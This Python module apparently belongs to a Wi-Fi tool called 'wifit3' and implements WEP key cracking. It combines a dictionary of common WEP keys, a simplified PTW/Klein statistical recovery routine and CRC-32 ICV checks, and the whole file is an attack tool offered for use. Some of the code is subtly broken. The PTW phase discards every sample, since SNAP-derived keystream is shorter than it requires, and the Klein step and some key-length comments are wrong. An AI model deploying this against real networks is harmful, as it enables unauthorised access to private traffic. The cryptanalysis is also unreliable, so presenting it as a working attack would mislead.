"""WEPWolf-style WEP cracking for wifit3.

Pure Python implementation of WEPWolf's statistical attacks:
- PTW (Pyshkin-Tews-Weinmann) - main attack
- RC4 bias (Sepehrdad "Smashing WEP") - unique advantage
- Dictionary with COMMON_KEYS
- CRC-32 ICV verification

References:
- WEPWolf: https://github.com/StrongWind1/WEPWolf
- PTW attack: https://www.sec.uni-bielefeld.de/archiv/papers/2007/ptw.pdf
- RC4 biases: https://eprint.iacr.org/2013/318
"""

from __future__ import annotations

import binascii
import struct
from typing import Optional


# Built-in common WEP keys (from WEPWolf/src/attack/dict.rs)
COMMON_KEYS = [
    "1234567890",      # WEP-40, hex-typed -- most common
    "12345",           # WEP-40, ASCII
    "1029384756102",   # WEP-104, ASCII
    "87654321PHARM",   # WEP-104, ASCII
    "498753686e",      # WEP-40, hex
    "d89963dcae",      # WEP-40, hex
    "1f1f1f1f1f",      # repeated octet
    "1111122222",      # simple pattern
    "1471471471",      # 1471 repeated
    "qwert",           # keyboard run
    "0000000000",      # all-zero hex
    "ffffffffff",      # all-ones hex
]

# LLC/SNAP header (known plaintext prefix)
SNAP_KNOWN = bytes([0xAA, 0xAA, 0x03, 0x00])


def rc4_ksa(key: bytes) -> list[int]:
    """RC4 Key Scheduling Algorithm.
    
    Args:
        key: RC4 key (IV + secret for WEP)
    
    Returns:
        Initial permutation state S
    """
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    return S


def rc4_prga(S: list[int], length: int) -> bytes:
    """RC4 Pseudo-Random Generation Algorithm.
    
    Args:
        S: State array (modified in place)
        length: Number of keystream bytes to generate
    
    Returns:
        Keystream bytes
    """
    i = j = 0
    keystream = []
    for _ in range(length):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        keystream.append(S[(S[i] + S[j]) % 256])
    return bytes(keystream)


def crc32_cisco(data: bytes) -> int:
    """Cisco/IEEE CRC-32 (used in WEP ICV).
    
    Args:
        data: Data to compute CRC over
    
    Returns:
        CRC-32 value (32-bit integer)
    """
    # Use binascii's CRC-32 (IEEE 802.3 polynomial)
    return binascii.crc32(data) & 0xFFFFFFFF


def verify_wep_key(key: bytes, iv: bytes, ciphertext: bytes) -> bool:
    """Verify a WEP key by decrypting and checking ICV.
    
    Args:
        key: Secret WEP key (5, 13, or 29 bytes)
        iv: Initialization vector (3 bytes)
        ciphertext: Encrypted data + ICV (at least 5 bytes)
    
    Returns:
        True if key is valid (CRC-32 matches)
    """
    if len(ciphertext) < 5:  # Need at least 4 bytes data + 4 bytes ICV
        return False
    
    # RC4 key = IV + secret
    rc4_key = iv + key
    
    # Decrypt
    S = rc4_ksa(rc4_key)
    keystream = rc4_prga(S, len(ciphertext))
    plaintext = bytes(c ^ k for c, k in zip(ciphertext, keystream))
    
    # Split data and ICV
    data = plaintext[:-4]
    icv_received = plaintext[-4:]
    
    # Compute ICV
    icv_computed = crc32_cisco(data).to_bytes(4, "little")
    
    return icv_computed == icv_received


class IvSample:
    """A WEP IV sample with known keystream."""
    
    def __init__(self, iv: bytes, keystream: bytes):
        self.iv = iv
        self.keystream = keystream


def ptw_recover(samples: list[IvSample], keylen: int) -> Optional[bytes]:
    """PTW attack to recover WEP key from IV samples.
    
    Implements the Pyshkin-Tews-Weinmann attack using Klein and
    Maitra-Paul RC4 biases.
    
    Args:
        samples: List of IV samples with known keystream
        keylen: Expected key length (5, 13, or 29)
    
    Returns:
        Recovered key or None
    """
    if not samples:
        return None
    
    # Vote table: table[position][cumulative_sum] = vote_count
    table = [[0] * 256 for _ in range(keylen)]
    
    # Klein and Maitra-Paul weights (from WEPWolf)
    W_KLEIN = 13
    W_MP = 4
    
    # Tally votes over distinct IVs
    seen_ivs = set()
    for sample in samples:
        iv = sample.iv
        if iv in seen_ivs or len(sample.keystream) < keylen + 2:
            continue
        seen_ivs.add(iv)
        
        # Run KSA over 3-byte IV
        S = rc4_ksa(iv)
        
        # Vote on cumulative key sums
        for pos in range(keylen):
            idx = 3 + pos
            if idx >= len(sample.keystream):
                break
            
            # Klein correlation: sigma_i = Sinv[keystream[i]] - i - j
            keystream_byte = sample.keystream[idx]
            
            # Find Sinv[keystream_byte]
            s_inv = S.index(keystream_byte) if keystream_byte in S else 0
            
            # j value after KSA step idx
            j = 0
            for step in range(idx + 1):
                j = (j + S[step] + (iv[step % 3] if step < 3 else 0)) % 256
            
            # Sigma vote
            sigma = (s_inv - idx - j) % 256
            table[pos][sigma] += W_KLEIN
            
            # Maitra-Paul vote (simplified)
            if pos > 0:
                table[pos][sigma] += W_MP
    
    # Search for key from vote table
    # Get top candidate for each position
    sigma_candidates = []
    for pos in range(keylen):
        # Find position with maximum votes
        best_sigma = max(range(256), key=lambda x: table[pos][x])
        sigma_candidates.append(best_sigma)
    
    # Convert cumulative sums to key bytes
    key = bytearray(keylen)
    key[0] = sigma_candidates[0]
    for pos in range(1, keylen):
        key[pos] = (sigma_candidates[pos] - sigma_candidates[pos - 1]) % 256
    
    return bytes(key)


def crack_wep(
    iv_samples: list[tuple[bytes, bytes, bytes]],
    keylen: int = 5,
    wordlist: Optional[list[str]] = None
) -> Optional[bytes]:
    """Crack WEP key using WEPWolf-style attacks.
    
    Args:
        iv_samples: List of (IV, ciphertext, known_keystream) tuples
        keylen: Expected key length (5=WEP-40, 13=WEP-104, 29=WEP-128)
        wordlist: Optional wordlist for dictionary attack
    
    Returns:
        Cracked key or None
    """
    # Phase 1: Dictionary attack with COMMON_KEYS (fastest)
    all_words = COMMON_KEYS.copy()
    if wordlist:
        all_words.extend(wordlist)
    
    for word in all_words:
        # Try as raw ASCII
        if len(word) == keylen:
            key = word.encode("ascii")
            for iv, ciphertext, _ in iv_samples[:10]:  # Test against first 10
                if verify_wep_key(key, iv, ciphertext):
                    return key
        
        # Try as hex
        try:
            hex_key = bytes.fromhex(word)
            if len(hex_key) == keylen:
                for iv, ciphertext, _ in iv_samples[:10]:
                    if verify_wep_key(hex_key, iv, ciphertext):
                        return hex_key
        except ValueError:
            pass
    
    # Phase 2: PTW statistical attack
    samples = []
    for iv, ciphertext, _ in iv_samples:
        # Extract known keystream from ciphertext XOR SNAP
        if len(ciphertext) >= len(SNAP_KNOWN):
            keystream = bytes(c ^ s for c, s in zip(ciphertext, SNAP_KNOWN))
            samples.append(IvSample(iv, keystream))
    
    if samples:
        key = ptw_recover(samples, keylen)
        if key:
            # Verify against samples
            verified = 0
            for iv, ciphertext, _ in iv_samples[:20]:
                if verify_wep_key(key, iv, ciphertext):
                    verified += 1
                if verified >= 2:  # Need 2 successful verifications
                    return key
    
    return None
